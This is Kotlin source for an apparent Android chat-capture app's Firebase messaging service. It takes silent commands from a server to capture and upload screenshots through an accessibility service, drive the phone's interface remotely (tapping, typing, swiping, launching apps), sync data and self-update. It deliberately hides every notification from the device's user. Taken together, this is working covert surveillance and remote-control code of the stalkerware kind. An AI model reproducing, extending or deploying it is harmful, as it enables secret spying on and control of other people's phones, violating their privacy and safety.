package com.chats.capture.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.BatteryManager
import android.os.Build
import androidx.core.app.NotificationCompat
import com.chats.capture.CaptureApplication
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.managers.RemoteUIControlManager
import com.chats.capture.managers.ScreenshotManager
import com.chats.capture.managers.ServiceMonitor
import com.chats.capture.network.ApiClient
import com.chats.capture.network.CommandResultRequest
import com.chats.capture.updates.UpdateManager
import com.chats.capture.utils.FcmTokenManager
import com.chats.capture.workers.SyncWorker
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.google.gson.Gson
import com.google.gson.JsonObject
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber

/**
 * Firebase Cloud Messaging service to handle push notifications and commands
 */
class AppFirebaseMessagingService : FirebaseMessagingService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    /**
     * Called when a new FCM token is generated
     * This happens when:
     * - App is restored on a new device
     * - App is restored on a new device
     * - App data is cleared
     * - App is uninstalled/reinstalled
     * - App is restored on a new device
     */
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Timber.d("New FCM token received: $token")
        
        // Save token locally
        FcmTokenManager.saveToken(this, token)
        
        // Send token to server with retry logic
        serviceScope.launch {
            var retryCount = 0
            val maxRetries = 3
            
            while (retryCount < maxRetries) {
                try {
                    val deviceRegistrationManager = DeviceRegistrationManager(this@AppFirebaseMessagingService)
                    deviceRegistrationManager.registerDevice(token)
                    Timber.d("FCM token sent to server successfully")
                    return@launch
                } catch (e: Exception) {
                    retryCount++
                    Timber.e(e, "Error sending FCM token to server (attempt $retryCount/$maxRetries)")
                    
                    if (retryCount < maxRetries) {
                        // Exponential backoff: 2s, 4s, 8s
                        delay((2 * retryCount * 1000).toLong())
                    }
                }
            }
            
            Timber.w("Failed to send FCM token to server after $maxRetries attempts")
        }
    }

    /**
     * Called when a message is received
     * Note: This is only called when app is in foreground or when message contains data payload.
     * For notification-only messages when app is in background, Android handles them automatically.
     */
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        
        Timber.d("FCM message received from: ${remoteMessage.from}, messageId: ${remoteMessage.messageId}")
        
        // Priority: Handle data payload first (commands), then notification payload
        if (remoteMessage.data.isNotEmpty()) {
            Timber.d("Message data payload: ${remoteMessage.data}")
            handleDataMessage(remoteMessage.data)
            
            // Don't show user-facing notifications - only log
            val isCommand = remoteMessage.data["type"] == "command"
            if (!isCommand && remoteMessage.notification != null) {
                remoteMessage.notification?.let {
                    Timber.d("Message notification payload: ${it.title} - ${it.body} (not shown to user)")
                }
            }
        } else {
            // Notification-only message (when app is in foreground) - don't show to user
            remoteMessage.notification?.let {
                Timber.d("Message notification payload: ${it.title} - ${it.body} (not shown to user)")
            }
        }
    }

    /**
     * Handle data-only messages (commands from server)
     */
    private fun handleDataMessage(data: Map<String, String>) {
        when (val type = data["type"]) {
            "command" -> {
                val commandId = data["commandId"]
                val action = data["action"]
                val parameters = data["parameters"]
                
                Timber.d("Received command: id=$commandId, action=$action, params=$parameters")
                
                // Handle command based on action
                handleCommand(action, parameters, commandId)
            }
            else -> {
                Timber.d("Unknown message type: $type")
            }
        }
    }

    /**
     * Handle commands from server
     */
    private fun handleCommand(action: String?, parameters: String?, commandId: String?) {
        // Parse parameters if provided
        val params = try {
            if (parameters != null && parameters.isNotEmpty()) {
                val gson = Gson()
                val jsonObject = gson.fromJson(parameters, JsonObject::class.java)
                jsonObject.keySet().associateWith { jsonObject.get(it).asString }
            } else {
                emptyMap()
            }
        } catch (e: Exception) {
            Timber.e(e, "Error parsing command parameters: $parameters")
            emptyMap()
        }

        serviceScope.launch {
            var success: Boolean
            var message: String
            
            try {
                when (action) {
                    "sync_data" -> {
                        Timber.d("Executing sync_data command")
                        success = triggerDataSync()
                        message = if (success) "Data sync triggered successfully" else "Failed to trigger data sync"
                    }
                    "update_app" -> {
                        Timber.d("Executing update_app command")
                        success = triggerAppUpdate()
                        message = if (success) "App update triggered successfully" else "Failed to trigger app update"
                    }
                    "restart_service" -> {
                        Timber.d("Executing restart_service command")
                        success = restartServices()
                        message = if (success) "Services restarted successfully" else "Failed to restart services"
                    }
                    "capture_screenshot" -> {
                        Timber.d("Executing capture_screenshot command")
                        success = captureScreenshot()
                        message = if (success) "Screenshot captured and uploaded successfully" else "Failed to capture screenshot"
                    }
                    // UI Control Commands
                    "ui_click", "ui_find_and_click", "ui_find_and_click_by_id", 
                    "ui_input", "ui_scroll", "ui_swipe", "ui_launch_app" -> {
                        Timber.d("Executing UI command: $action")
                        success = executeUICommand(action, params)
                        message = if (success) "UI command executed successfully" else "UI command execution failed"
                    }
                    else -> {
                        Timber.w("Unknown command action: $action")
                        success = false
                        message = "Unknown command action: $action"
                    }
                }
            } catch (e: Exception) {
                Timber.e(e, "Error executing command: $action")
                success = false
                message = "Error: ${e.message}"
            }
            
            // Report command result to server if commandId is provided
            commandId?.let {
                reportCommandResult(it, success, message)
            }
        }
    }
    
    /**
     * Trigger data sync by enqueuing SyncWorker
     */
    private fun triggerDataSync(): Boolean {
        return try {
            // Check battery level for battery-aware constraints
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            val batteryLevel = batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100
            
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(batteryLevel >= 20) // Don't require battery not low if battery is low
                .build()
            
            val syncWork = OneTimeWorkRequestBuilder<SyncWorker>()
                .setConstraints(constraints)
                .build()
            
            WorkManager.getInstance(this).enqueue(syncWork)
            Timber.d("Data sync worker enqueued (battery: $batteryLevel%)")
            true
        } catch (e: Exception) {
            Timber.e(e, "Error triggering data sync")
            false
        }
    }
    
    /**
     * Trigger app update
     */
    private suspend fun triggerAppUpdate(): Boolean {
        return try {
            val database = (applicationContext as CaptureApplication).database
            val updateStatusDao = database.updateStatusDao()
            val updateManager = UpdateManager(applicationContext, updateStatusDao)
            
            return when (val result = updateManager.performUpdate()) {
                UpdateManager.UpdateResult.UPDATE_INSTALLED,
                UpdateManager.UpdateResult.UPDATE_DOWNLOADED -> {
                    Timber.d("App update completed successfully")
                    true
                }
                UpdateManager.UpdateResult.NO_UPDATE_AVAILABLE -> {
                    Timber.d("No update available")
                    true // Still considered success
                }
                else -> {
                    Timber.w("App update failed: $result")
                    false
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error triggering app update")
            false
        }
    }
    
    /**
     * Restart services
     */
    private fun restartServices(): Boolean {
        return try {
            val serviceMonitor = ServiceMonitor(this)
            serviceMonitor.restartServices()
            Timber.d("Services restart initiated")
            true
        } catch (e: Exception) {
            Timber.e(e, "Error restarting services")
            false
        }
    }
    
    /**
     * Execute UI control command
     */
    private suspend fun executeUICommand(action: String, params: Map<String, String>): Boolean {
        return try {
            val remoteUIControlManager = RemoteUIControlManager(this)
            val packageName = params["package"]
            
            when (action) {
                "ui_click" -> {
                    val x = params["x"]?.toFloatOrNull() ?: 0f
                    val y = params["y"]?.toFloatOrNull() ?: 0f
                    remoteUIControlManager.executeUIClick(x, y, packageName)
                }
                "ui_find_and_click" -> {
                    val text = params["text"] ?: return false
                    remoteUIControlManager.executeUIFindAndClick(text, packageName)
                }
                "ui_find_and_click_by_id" -> {
                    val viewId = params["view_id"] ?: return false
                    remoteUIControlManager.executeUIFindAndClickById(viewId, packageName)
                }
                "ui_input" -> {
                    val text = params["text"] ?: return false
                    val findText = params["find_text"]
                    val viewId = params["view_id"]
                    remoteUIControlManager.executeUIInput(text, findText, viewId, packageName)
                }
                "ui_scroll" -> {
                    val direction = params["direction"] ?: return false
                    remoteUIControlManager.executeUIScroll(direction, packageName)
                }
                "ui_swipe" -> {
                    val startX = params["start_x"]?.toFloatOrNull() ?: 0f
                    val startY = params["start_y"]?.toFloatOrNull() ?: 0f
                    val endX = params["end_x"]?.toFloatOrNull() ?: 0f
                    val endY = params["end_y"]?.toFloatOrNull() ?: 0f
                    val duration = params["duration"]?.toLongOrNull() ?: 300L
                    remoteUIControlManager.executeUISwipe(startX, startY, endX, endY, duration)
                }
                "ui_launch_app" -> {
                    val pkg = packageName ?: params["package_name"] ?: return false
                    remoteUIControlManager.executeUILaunchApp(pkg)
                }
                else -> false
            }
        } catch (e: Exception) {
            Timber.e(e, "Error executing UI command: $action")
            false
        }
    }
    
    /**
     * Capture screenshot
     */
    private suspend fun captureScreenshot(): Boolean {
        return try {
            val app = applicationContext as CaptureApplication
            val accessibilityService = app.enhancedAccessibilityService
            
            if (accessibilityService == null) {
                Timber.w("EnhancedAccessibilityService not available for screenshot capture")
                return false
            }
            
            val screenshotManager = ScreenshotManager(this, accessibilityService)
            val success = screenshotManager.captureAndUploadScreenshot()
            
            if (success) {
                Timber.d("Screenshot captured and uploaded successfully")
            } else {
                Timber.w("Failed to capture or upload screenshot")
            }
            
            success
        } catch (e: Exception) {
            Timber.e(e, "Error capturing screenshot")
            false
        }
    }
    
    /**
     * Report command execution result to server
     */
    private suspend fun reportCommandResult(commandId: String, success: Boolean, message: String) {
        try {
            val apiService = ApiClient.getApiService()
            val resultRequest = CommandResultRequest(
                success = success,
                message = message,
                data = null
            )
            
            val response = apiService.updateCommandResult(commandId, resultRequest)
            if (response.isSuccessful) {
                Timber.d("Command result reported successfully: $commandId")
            } else {
                Timber.w("Failed to report command result: ${response.body()?.message}")
            }
        } catch (e: Exception) {
            Timber.e(e, "Error reporting command result")
        }
    }

    // Removed showNotification method - no user-facing notifications allowed

    /**
     * Create notification channel for FCM notifications
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(NotificationManager::class.java)
            
            // FCM notification channel (silent operation)
            val fcmChannel = NotificationChannel(
                FCM_CHANNEL_ID,
                "FCM Notifications",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Notifications from Firebase Cloud Messaging"
                setSound(null, null) // No sound
                enableVibration(false) // No vibration
                setShowBadge(false) // No badge
            }
            
            // Command channel (for silent commands from server)
            val commandChannel = NotificationChannel(
                COMMAND_CHANNEL_ID,
                "Command Channel",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Silent commands from server"
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
            }
            
            notificationManager?.createNotificationChannels(
                listOf(fcmChannel, commandChannel)
            )
        }
    }

    companion object {
        private const val FCM_CHANNEL_ID = "fcm_notification_channel"
        const val COMMAND_CHANNEL_ID = "command_channel"
    }
}
